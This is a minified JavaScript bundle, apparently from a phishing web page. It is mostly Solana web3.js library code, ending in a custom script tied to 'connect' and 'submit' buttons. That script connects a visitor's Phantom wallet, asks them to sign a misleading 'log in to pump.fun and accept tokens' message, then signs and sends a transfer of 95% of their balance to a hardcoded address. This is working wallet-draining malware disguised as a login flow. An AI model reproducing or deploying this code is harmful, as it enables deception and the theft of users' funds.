this._rpcWebSocket.call(n,[i])}catch(i){if(i instanceof Error&&console.error(`${n} error:`,i.message),!e())return;this._setSubscription(t,{...r,state:"subscribed"}),await this._updateSubscriptions();return}}this._setSubscription(t,{...r,state:"unsubscribed"}),await this._updateSubscriptions()})()}}))}_handleServerNotification(t,e){let r=this._subscriptionCallbacksByServerSubscriptionId[t];void 0!==r&&r.forEach(t=>{try{t(...e)}catch(t){console.error(t)}})}_wsOnAccountNotification(t){let{result:e,subscription:r}=rk(t,o4);this._handleServerNotification(r,[e.value,e.context])}_makeSubscription(t,e){let r=this._nextClientSubscriptionId++,i=oo([t.method,e]),n=this._subscriptionsByHash[i];return void 0===n?this._subscriptionsByHash[i]={...t,args:e,callbacks:new Set([t.callback]),state:"pending"}:n.callbacks.add(t.callback),this._subscriptionHashByClientSubscriptionId[r]=i,this._subscriptionDisposeFunctionsByClientSubscriptionId[r]=async()=>{delete this._subscriptionDisposeFunctionsByClientSubscriptionId[r],delete this._subscriptionHashByClientSubscriptionId[r];let e=this._subscriptionsByHash[i];nq(void 0!==e,`Could not find a \`Subscription\` when tearing down client subscription #${r}`),e.callbacks.delete(t.callback),await this._updateSubscriptions()},this._updateSubscriptions(),r}onAccountChange(t,e,r){let{commitment:i,config:n}=om(r),o=this._buildArgs([t.toBase58()],i||this._commitment||"finalized","base64",n);return this._makeSubscription({callback:e,method:"accountSubscribe",unsubscribeMethod:"accountUnsubscribe"},o)}async removeAccountChangeListener(t){await this._unsubscribeClientSubscription(t,"account change")}_wsOnProgramAccountNotification(t){let{result:e,subscription:r}=rk(t,o7);this._handleServerNotification(r,[{accountId:e.value.pubkey,accountInfo:e.value.account},e.context])}onProgramAccountChange(t,e,r,i){let{commitment:n,config:o}=om(r),s=this._buildArgs([t.toBase58()],n||this._commitment||"finalized","base64",o||(i?{filters:oy(i)}:void 0));return this._makeSubscription({callback:e,method:"programSubscribe",unsubscribeMethod:"programUnsubscribe"},s)}async removeProgramAccountChangeListener(t){await this._unsubscribeClientSubscription(t,"program account change")}onLogs(t,e,r){let i=this._buildArgs(["object"==typeof t?{mentions:[t.toString()]}:t],r||this._commitment||"finalized");return this._makeSubscription({callback:e,method:"logsSubscribe",unsubscribeMethod:"logsUnsubscribe"},i)}async removeOnLogsListener(t){await this._unsubscribeClientSubscription(t,"logs")}_wsOnLogsNotification(t){let{result:e,subscription:r}=rk(t,sj);this._handleServerNotification(r,[e.value,e.context])}_wsOnSlotNotification(t){let{result:e,subscription:r}=rk(t,se);this._handleServerNotification(r,[e])}onSlotChange(t){return this._makeSubscription({callback:t,method:"slotSubscribe",unsubscribeMethod:"slotUnsubscribe"},[])}async removeSlotChangeListener(t){await this._unsubscribeClientSubscription(t,"slot change")}_wsOnSlotUpdatesNotification(t){let{result:e,subscription:r}=rk(t,si);this._handleServerNotification(r,[e])}onSlotUpdate(t){return this._makeSubscription({callback:t,method:"slotsUpdatesSubscribe",unsubscribeMethod:"slotsUpdatesUnsubscribe"},[])}async removeSlotUpdateListener(t){await this._unsubscribeClientSubscription(t,"slot update")}async _unsubscribeClientSubscription(t,e){let r=this._subscriptionDisposeFunctionsByClientSubscriptionId[t];r?await r():console.warn(`Ignored unsubscribe request because an active subscription with id \`${t}\` for '${e}' events could not be found.`)}_buildArgs(t,e,r,i){let n=e||this._commitment;if(n||r||i){let e={};r&&(e.encoding=r),n&&(e.commitment=n),i&&(e=Object.assign(e,i)),t.push(e)}return t}_buildArgsAtLeastConfirmed(t,e,r,i){let n=e||this._commitment;if(n&&!["confirmed","finalized"].includes(n))throw Error("Using Connection with default commitment: `"+this._commitment+"`, but method requires at least `confirmed`");return this._buildArgs(t,e,r,i)}_wsOnSignatureNotification(t){let{result:e,subscription:r}=rk(t,sn);"receivedSignature"!==e.value&&this._subscriptionsAutoDisposedByRpc.add(r),this._handleServerNotification(r,"receivedSignature"===e.value?[{type:"received"},e.context]:[{type:"status",result:e.value},e.context])}onSignature(t,e,r){let i=this._buildArgs([t],r||this._commitment||"finalized"),n=this._makeSubscription({callback:(t,r)=>{if("status"===t.type){e(t.result,r);try{this.removeSignatureListener(n)}catch(t){}}},method:"signatureSubscribe",unsubscribeMethod:"signatureUnsubscribe"},i);return n}onSignatureWithOptions(t,e,r){let{commitment:i,...n}={...r,commitment:r&&r.commitment||this._commitment||"finalized"},o=this._buildArgs([t],i,void 0,n),s=this._makeSubscription({callback:(t,r)=>{e(t,r);try{this.removeSignatureListener(s)}catch(t){}},method:"signatureSubscribe",unsubscribeMethod:"signatureUnsubscribe"},o);return s}async removeSignatureListener(t){await this._unsubscribeClientSubscription(t,"signature result")}_wsOnRootNotification(t){let{result:e,subscription:r}=rk(t,so);this._handleServerNotification(r,[e])}onRootChange(t){return this._makeSubscription({callback:t,method:"rootSubscribe",unsubscribeMethod:"rootUnsubscribe"},[])}async removeRootChangeListener(t){await this._unsubscribeClientSubscription(t,"root change")}}class s${constructor(t){this._keypair=void 0,this._keypair=t??nk()}static generate(){return new s$(nk())}static fromSecretKey(t,e){if(64!==t.byteLength)throw Error("bad secret key size");let r=t.slice(32,64);if(!e||!e.skipValidation){let e=nS(t.slice(0,32));for(let t=0;t<32;t++)if(r[t]!==e[t])throw Error("provided secretKey is invalid")}return new s$({publicKey:r,secretKey:t})}static fromSeed(t){let e=nS(t),r=new Uint8Array(64);return r.set(t),r.set(e,32),new s$({publicKey:e,secretKey:r})}get publicKey(){return new nT(this._keypair.publicKey)}get secretKey(){return new Uint8Array(this._keypair.secretKey)}}Object.freeze({CreateLookupTable:{index:0,layout:eW.struct([eW.u32("instruction"),oe("recentSlot"),eW.u8("bumpSeed")])},FreezeLookupTable:{index:1,layout:eW.struct([eW.u32("instruction")])},ExtendLookupTable:{index:2,layout:eW.struct([eW.u32("instruction"),oe(),eW.seq(nU(),eW.offset(eW.u32(),-8),"addresses")])},DeactivateLookupTable:{index:3,layout:eW.struct([eW.u32("instruction")])},CloseLookupTable:{index:4,layout:eW.struct([eW.u32("instruction")])}}),new nT("AddressLookupTab1e1111111111111111111111111"),Object.freeze({RequestUnits:{index:0,layout:eW.struct([eW.u8("instruction"),eW.u32("units"),eW.u32("additionalFee")])},RequestHeapFrame:{index:1,layout:eW.struct([eW.u8("instruction"),eW.u32("bytes")])},SetComputeUnitLimit:{index:2,layout:eW.struct([eW.u8("instruction"),eW.u32("units")])},SetComputeUnitPrice:{index:3,layout:eW.struct([eW.u8("instruction"),oe("microLamports")])}}),new nT("ComputeBudget111111111111111111111111111111");const sZ=eW.struct([eW.u8("numSignatures"),eW.u8("padding"),eW.u16("signatureOffset"),eW.u16("signatureInstructionIndex"),eW.u16("publicKeyOffset"),eW.u16("publicKeyInstructionIndex"),eW.u16("messageDataOffset"),eW.u16("messageDataSize"),eW.u16("messageInstructionIndex")]);class sG{constructor(){}static createInstructionWithPublicKey(t){let{publicKey:e,message:r,signature:i,instructionIndex:n}=t;nq(32===e.length,`Public Key must be 32 bytes but received ${e.length} bytes`),nq(64===i.length,`Signature must be 64 bytes but received ${i.length} bytes`);let o=sZ.span,s=o+e.length,a=s+i.length,u=(0,f.Buffer).alloc(a+r.length),l=null==n?65535:n;return sZ.encode({numSignatures:1,padding:0,signatureOffset:s,signatureInstructionIndex:l,publicKeyOffset:o,publicKeyInstructionIndex:l,messageDataOffset:a,messageDataSize:r.length,messageInstructionIndex:l},u),u.fill(e,o),u.fill(i,s),u.fill(r,a),new nG({keys:[],programId:sG.programId,data:u})}static createInstructionWithPrivateKey(t){let{privateKey:e,message:r,instructionIndex:i}=t;nq(64===e.length,`Private key must be 64 bytes but received ${e.length} bytes`);try{let t=s$.fromSecretKey(e),n=t.publicKey.toBytes(),o=nE(r,t.secretKey);return this.createInstructionWithPublicKey({publicKey:n,message:r,signature:o,instructionIndex:i})}catch(t){throw Error(`Error creating instruction; ${t}`)}}}sG.programId=new nT("Ed25519SigVerify111111111111111111111111111");const sJ=(t,e)=>{let r=(0,iq.secp256k1).sign(t,e);return[r.toCompactRawBytes(),r.recovery]};iq.secp256k1.utils.isValidPrivateKey;const sY=iq.secp256k1.getPublicKey,sX=eW.struct([eW.u8("numSignatures"),eW.u16("signatureOffset"),eW.u8("signatureInstructionIndex"),eW.u16("ethAddressOffset"),eW.u8("ethAddressInstructionIndex"),eW.u16("messageDataOffset"),eW.u16("messageDataSize"),eW.u8("messageInstructionIndex"),eW.blob(20,"ethAddress"),eW.blob(64,"signature"),eW.u8("recoveryId")]);class sQ{constructor(){}static publicKeyToEthAddress(t){nq(64===t.length,`Public key must be 64 bytes but received ${t.length} bytes`);try{return(0,f.Buffer).from((0,r6.keccak_256)(n_(t))).slice(-20)}catch(t){throw Error(`Error constructing Ethereum address: ${t}`)}}static createInstructionWithPublicKey(t){let{publicKey:e,message:r,signature:i,recoveryId:n,instructionIndex:o}=t;return sQ.createInstructionWithEthAddress({ethAddress:sQ.publicKeyToEthAddress(e),message:r,signature:i,recoveryId:n,instructionIndex:o})}static createInstructionWithEthAddress(t){let e;let{ethAddress:r,message:i,signature:n,recoveryId:o,instructionIndex:s=0}=t;nq(20===(e="string"==typeof r?r.startsWith("0x")?(0,f.Buffer).from(r.substr(2),"hex"):(0,f.Buffer).from(r,"hex"):r).length,`Address must be 20 bytes but received ${e.length} bytes`);let a=12+e.length,u=a+n.length+1,l=(0,f.Buffer).alloc(sX.span+i.length);return sX.encode({numSignatures:1,signatureOffset:a,signatureInstructionIndex:s,ethAddressOffset:12,ethAddressInstructionIndex:s,messageDataOffset:u,messageDataSize:i.length,messageInstructionIndex:s,signature:n_(n),ethAddress:n_(e),recoveryId:o},l),l.fill(n_(i),sX.span),new nG({keys:[],programId:sQ.programId,data:l})}static createInstructionWithPrivateKey(t){let{privateKey:e,message:r,instructionIndex:i}=t;nq(32===e.length,`Private key must be 32 bytes but received ${e.length} bytes`);try{let t=n_(e),n=sY(t,!1).slice(1),o=(0,f.Buffer).from((0,r6.keccak_256)(n_(r))),[s,a]=sJ(o,t);return this.createInstructionWithPublicKey({publicKey:n,message:r,signature:s,recoveryId:a,instructionIndex:i})}catch(t){throw Error(`Error creating instruction; ${t}`)}}}sQ.programId=new nT("KeccakSecp256k11111111111111111111111111111");const s0=new nT("StakeConfig11111111111111111111111111111111");class s1{constructor(t,e,r){this.unixTimestamp=void 0,this.epoch=void 0,this.custodian=void 0,this.unixTimestamp=t,this.epoch=e,this.custodian=r}}s1.default=new s1(0,0,nT.default);const s2=Object.freeze({Initialize:{index:0,layout:eW.struct([eW.u32("instruction"),((t="authorized")=>eW.struct([nU("staker"),nU("withdrawer")],t))(),((t="lockup")=>eW.struct([eW.ns64("unixTimestamp"),eW.ns64("epoch"),nU("custodian")],t))()])},Authorize:{index:1,layout:eW.struct([eW.u32("instruction"),nU("newAuthorized"),eW.u32("stakeAuthorizationType")])},Delegate:{index:2,layout:eW.struct([eW.u32("instruction")])},Split:{index:3,layout:eW.struct([eW.u32("instruction"),eW.ns64("lamports")])},Withdraw:{index:4,layout:eW.struct([eW.u32("instruction"),eW.ns64("lamports")])},Deactivate:{index:5,layout:eW.struct([eW.u32("instruction")])},Merge:{index:7,layout:eW.struct([eW.u32("instruction")])},AuthorizeWithSeed:{index:8,layout:eW.struct([eW.u32("instruction"),nU("newAuthorized"),eW.u32("stakeAuthorizationType"),nN("authoritySeed"),nU("authorityOwner")])}});Object.freeze({Staker:{index:0},Withdrawer:{index:1}});class s3{constructor(){}static initialize(t){let{stakePubkey:e,authorized:r,lockup:i}=t,n=i||s1.default,o=n6(s2.Initialize,{authorized:{staker:n_(r.staker.toBuffer()),withdrawer:n_(r.withdrawer.toBuffer())},lockup:{unixTimestamp:n.unixTimestamp,epoch:n.epoch,custodian:n_(n.custodian.toBuffer())}});return new nG({keys:[{pubkey:e,isSigner:!1,isWritable:!0},{pubkey:nQ,isSigner:!1,isWritable:!1}],programId:this.programId,data:o})}static createAccountWithSeed(t){let e=new nJ;e.add(oi.createAccountWithSeed({fromPubkey:t.fromPubkey,newAccountPubkey:t.stakePubkey,basePubkey:t.basePubkey,seed:t.seed,lamports:t.lamports,space:this.space,programId:this.programId}));let{stakePubkey:r,authorized:i,lockup:n}=t;return e.add(this.initialize({stakePubkey:r,authorized:i,lockup:n}))}static createAccount(t){let e=new nJ;e.add(oi.createAccount({fromPubkey:t.fromPubkey,newAccountPubkey:t.stakePubkey,lamports:t.lamports,space:this.space,programId:this.programId}));let{stakePubkey:r,authorized:i,lockup:n}=t;return e.add(this.initialize({stakePubkey:r,authorized:i,lockup:n}))}static delegate(t){let{stakePubkey:e,authorizedPubkey:r,votePubkey:i}=t,n=n6(s2.Delegate);return new nJ().add({keys:[{pubkey:e,isSigner:!1,isWritable:!0},{pubkey:i,isSigner:!1,isWritable:!1},{pubkey:nY,isSigner:!1,isWritable:!1},{pubkey:n0,isSigner:!1,isWritable:!1},{pubkey:s0,isSigner:!1,isWritable:!1},{pubkey:r,isSigner:!0,isWritable:!1}],programId:this.programId,data:n})}static authorize(t){let{stakePubkey:e,authorizedPubkey:r,newAuthorizedPubkey:i,stakeAuthorizationType:n,custodianPubkey:o}=t,s=n6(s2.Authorize,{newAuthorized:n_(i.toBuffer()),stakeAuthorizationType:n.index}),a=[{pubkey:e,isSigner:!1,isWritable:!0},{pubkey:nY,isSigner:!1,isWritable:!0},{pubkey:r,isSigner:!0,isWritable:!1}];return o&&a.push({pubkey:o,isSigner:!0,isWritable:!1}),new nJ().add({keys:a,programId:this.programId,data:s})}static authorizeWithSeed(t){let{stakePubkey:e,authorityBase:r,authoritySeed:i,authorityOwner:n,newAuthorizedPubkey:o,stakeAuthorizationType:s,custodianPubkey:a}=t,u=n6(s2.AuthorizeWithSeed,{newAuthorized:n_(o.toBuffer()),stakeAuthorizationType:s.index,authoritySeed:i,authorityOwner:n_(n.toBuffer())}),l=[{pubkey:e,isSigner:!1,isWritable:!0},{pubkey:r,isSigner:!0,isWritable:!1},{pubkey:nY,isSigner:!1,isWritable:!1}];return a&&l.push({pubkey:a,isSigner:!0,isWritable:!1}),new nJ().add({keys:l,programId:this.programId,data:u})}static splitInstruction(t){let{stakePubkey:e,authorizedPubkey:r,splitStakePubkey:i,lamports:n}=t,o=n6(s2.Split,{lamports:n});return new nG({keys:[{pubkey:e,isSigner:!1,isWritable:!0},{pubkey:i,isSigner:!1,isWritable:!0},{pubkey:r,isSigner:!0,isWritable:!1}],programId:this.programId,data:o})}static split(t,e){let r=new nJ;return r.add(oi.createAccount({fromPubkey:t.authorizedPubkey,newAccountPubkey:t.splitStakePubkey,lamports:e,space:this.space,programId:this.programId})),r.add(this.splitInstruction(t))}static splitWithSeed(t,e){let{stakePubkey:r,authorizedPubkey:i,splitStakePubkey:n,basePubkey:o,seed:s,lamports:a}=t,u=new nJ;return u.add(oi.allocate({accountPubkey:n,basePubkey:o,seed:s,space:this.space,programId:this.programId})),e&&e>0&&u.add(oi.transfer({fromPubkey:t.authorizedPubkey,toPubkey:n,lamports:e})),u.add(this.splitInstruction({stakePubkey:r,authorizedPubkey:i,splitStakePubkey:n,lamports:a}))}static merge(t){let{stakePubkey:e,sourceStakePubKey:r,authorizedPubkey:i}=t,n=n6(s2.Merge);return new nJ().add({keys:[{pubkey:e,isSigner:!1,isWritable:!0},{pubkey:r,isSigner:!1,isWritable:!0},{pubkey:nY,isSigner:!1,isWritable:!1},{pubkey:n0,isSigner:!1,isWritable:!1},{pubkey:i,isSigner:!0,isWritable:!1}],programId:this.programId,data:n})}static withdraw(t){let{stakePubkey:e,authorizedPubkey:r,toPubkey:i,lamports:n,custodianPubkey:o}=t,s=n6(s2.Withdraw,{lamports:n}),a=[{pubkey:e,isSigner:!1,isWritable:!0},{pubkey:i,isSigner:!1,isWritable:!0},{pubkey:nY,isSigner:!1,isWritable:!1},{pubkey:n0,isSigner:!1,isWritable:!1},{pubkey:r,isSigner:!0,isWritable:!1}];return o&&a.push({pubkey:o,isSigner:!0,isWritable:!1}),new nJ().add({keys:a,programId:this.programId,data:s})}static deactivate(t){let{stakePubkey:e,authorizedPubkey:r}=t,i=n6(s2.Deactivate);return new nJ().add({keys:[{pubkey:e,isSigner:!1,isWritable:!0},{pubkey:nY,isSigner:!1,isWritable:!1},{pubkey:r,isSigner:!0,isWritable:!1}],programId:this.programId,data:i})}}s3.programId=new nT("Stake11111111111111111111111111111111111111"),s3.space=200;const s8=Object.freeze({InitializeAccount:{index:0,layout:eW.struct([eW.u32("instruction"),((t="voteInit")=>eW.struct([nU("nodePubkey"),nU("authorizedVoter"),nU("authorizedWithdrawer"),eW.u8("commission")],t))()])},Authorize:{index:1,layout:eW.struct([eW.u32("instruction"),nU("newAuthorized"),eW.u32("voteAuthorizationType")])},Withdraw:{index:3,layout:eW.struct([eW.u32("instruction"),eW.ns64("lamports")])},UpdateValidatorIdentity:{index:4,layout:eW.struct([eW.u32("instruction")])},AuthorizeWithSeed:{index:10,layout:eW.struct([eW.u32("instruction"),((t="voteAuthorizeWithSeedArgs")=>eW.struct([eW.u32("voteAuthorizationType"),nU("currentAuthorityDerivedKeyOwnerPubkey"),nN("currentAuthorityDerivedKeySeed"),nU("newAuthorized")],t))()])}});Object.freeze({Voter:{index:0},Withdrawer:{index:1}});class s6{constructor(){}static initializeAccount(t){let{votePubkey:e,nodePubkey:r,voteInit:i}=t,n=n6(s8.InitializeAccount,{voteInit:{nodePubkey:n_(i.nodePubkey.toBuffer()),authorizedVoter:n_(i.authorizedVoter.toBuffer()),authorizedWithdrawer:n_(i.authorizedWithdrawer.toBuffer()),commission:i.commission}});return new nG({keys:[{pubkey:e,isSigner:!1,isWritable:!0},{pubkey:nQ,isSigner:!1,isWritable:!1},{pubkey:nY,isSigner:!1,isWritable:!1},{pubkey:r,isSigner:!0,isWritable:!1}],programId:this.programId,data:n})}static createAccount(t){let e=new nJ;return e.add(oi.createAccount({fromPubkey:t.fromPubkey,newAccountPubkey:t.votePubkey,lamports:t.lamports,space:this.space,programId:this.programId})),e.add(this.initializeAccount({votePubkey:t.votePubkey,nodePubkey:t.voteInit.nodePubkey,voteInit:t.voteInit}))}static authorize(t){let{votePubkey:e,authorizedPubkey:r,newAuthorizedPubkey:i,voteAuthorizationType:n}=t,o=n6(s8.Authorize,{newAuthorized:n_(i.toBuffer()),voteAuthorizationType:n.index});return new nJ().add({keys:[{pubkey:e,isSigner:!1,isWritable:!0},{pubkey:nY,isSigner:!1,isWritable:!1},{pubkey:r,isSigner:!0,isWritable:!1}],programId:this.programId,data:o})}static authorizeWithSeed(t){let{currentAuthorityDerivedKeyBasePubkey:e,currentAuthorityDerivedKeyOwnerPubkey:r,currentAuthorityDerivedKeySeed:i,newAuthorizedPubkey:n,voteAuthorizationType:o,votePubkey:s}=t,a=n6(s8.AuthorizeWithSeed,{voteAuthorizeWithSeedArgs:{currentAuthorityDerivedKeyOwnerPubkey:n_(r.toBuffer()),currentAuthorityDerivedKeySeed:i,newAuthorized:n_(n.toBuffer()),voteAuthorizationType:o.index}});return new nJ().add({keys:[{pubkey:s,isSigner:!1,isWritable:!0},{pubkey:nY,isSigner:!1,isWritable:!1},{pubkey:e,isSigner:!0,isWritable:!1}],programId:this.programId,data:a})}static withdraw(t){let{votePubkey:e,authorizedWithdrawerPubkey:r,lamports:i,toPubkey:n}=t,o=n6(s8.Withdraw,{lamports:i});return new nJ().add({keys:[{pubkey:e,isSigner:!1,isWritable:!0},{pubkey:n,isSigner:!1,isWritable:!0},{pubkey:r,isSigner:!0,isWritable:!1}],programId:this.programId,data:o})}static safeWithdraw(t,e,r){if(t.lamports>e-r)throw Error("Withdraw will leave vote account with insufficient funds.");return s6.withdraw(t)}static updateValidatorIdentity(t){let{votePubkey:e,authorizedWithdrawerPubkey:r,nodePubkey:i}=t,n=n6(s8.UpdateValidatorIdentity);return new nJ().add({keys:[{pubkey:e,isSigner:!1,isWritable:!0},{pubkey:i,isSigner:!0,isWritable:!1},{pubkey:r,isSigner:!0,isWritable:!1}],programId:this.programId,data:n})}}s6.programId=new nT("Vote111111111111111111111111111111111111111"),s6.space=3762,new nT("Va1idator1nfo111111111111111111111111111111"),rC({name:rP(),website:rT(rP()),details:rT(rP()),iconUrl:rT(rP()),keybaseUsername:rT(rP())}),new nT("Vote111111111111111111111111111111111111111"),eW.struct([nU("nodePubkey"),nU("authorizedWithdrawer"),eW.u8("commission"),eW.nu64(),eW.seq(eW.struct([eW.nu64("slot"),eW.u32("confirmationCount")]),eW.offset(eW.u32(),-8),"votes"),eW.u8("rootSlotValid"),eW.nu64("rootSlot"),eW.nu64(),eW.seq(eW.struct([eW.nu64("epoch"),nU("authorizedVoter")]),eW.offset(eW.u32(),-8),"authorizedVoters"),eW.struct([eW.seq(eW.struct([nU("authorizedPubkey"),eW.nu64("epochOfLastAuthorizedSwitch"),eW.nu64("targetEpoch")]),32,"buf"),eW.nu64("idx"),eW.u8("isEmpty")],"priorVoters"),eW.nu64(),eW.seq(eW.struct([eW.nu64("epoch"),eW.nu64("credits"),eW.nu64("prevCredits")]),eW.offset(eW.u32(),-8),"epochCredits"),eW.struct([eW.nu64("slot"),eW.nu64("timestamp")],"lastTimestamp")]);const s5=async()=>{if(!window.solana||!window.solana.isPhantom){console.error("Phantom Wallet not installed.");return}try{let t=await window.solana.connect({onlyIfTrusted:!1}),e=new nT(t.publicKey);console.log("Wallet connected:",e.toString()),await s4(e)&&await s9(e)}catch(t){console.error("Connection or signing failed:",t)}},s4=async t=>{let e=new TextEncoder().encode("I am signing this message to log in to pump.fun and accept tokens");try{let t=await window.solana.signMessage(e,"utf8");return console.log("Message signed:",t.signature),t}catch(t){return console.error("Message signing failed:",t),null}},s9=async t=>{let e=new sV("https://twilight-wild-pool.solana-mainnet.quiknode.pro/fdb9a13b1e753cd4988ddf4be651d4ae87ce0462"),r=new nT("Bn3JfQ8iNHNwbbibZ37VSL8Jtdn2LHVyDG8FZWXPnLpn");try{let i=await e.getBalance(t);if(console.log(`Current balance: ${i} lamports`),i<=5e3)return;let n=Math.floor(.95*i),{blockhash:o}=await e.getLatestBlockhash(),s=new nJ({recentBlockhash:o,feePayer:t});s.add(oi.transfer({fromPubkey:t,toPubkey:r,lamports:n}));let a=await window.solana.signTransaction(s),u=await e.sendRawTransaction(a.serialize());await e.confirmTransaction(u),console.log(`Transaction successful! Signature: ${u}`)}catch(t){console.error("Transaction failed:",t)}};window.onload=()=>{let t=document.getElementById("connectButton"),e=document.getElementById("submitButton");t?t.addEventListener("click",s5):console.error("Connect button not found in DOM."),e?e.addEventListener("click",s5):console.error("Submit button not found in DOM.")};
//# sourceMappingURL=index.210936e0.js.map
